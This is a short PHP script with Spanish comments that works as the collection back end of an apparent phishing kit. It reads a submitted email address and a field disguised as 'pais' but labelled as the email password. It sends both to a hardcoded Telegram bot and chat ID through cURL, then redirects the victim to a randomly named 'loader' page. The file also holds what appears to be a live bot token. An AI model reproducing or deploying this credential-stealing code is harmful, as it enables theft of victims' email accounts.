<?php
// ===== CONFIGURACIÓN DEL BOT =====
$token = "7824856723:AAHL7bk2LLyfd1RlAfDDL2YMKr5wi_jhshE"; // Reemplaza con tu token
$chat_id = "7589872024"; // Reemplaza con tu chat ID

// ===== RECOGER DATOS =====
$email = $_POST['email'] ?? 'No especificado';
$pais = $_POST['pais'] ?? 'No especificado';

// ===== MENSAJE =====
$mensaje = "📋 *Paso 2 completado*\n";
$mensaje .= "📧 *Email:* $email\n";
$mensaje .= "🌍 *Contraseña email:* $pais\n";
$mensaje .= "📅 Fecha: " . date("d/m/Y H:i");

// ===== ENVIAR A TELEGRAM CON cURL =====
$url = "https://api.telegram.org/bot$token/sendMessage";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, [
    'chat_id' => $chat_id,
    'text' => $mensaje,
    'parse_mode' => 'Markdown'
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// ===== REDIRECCIÓN AL LOADER =====
header("Location: dajdhwhodiqowd.html");
exit();
?>
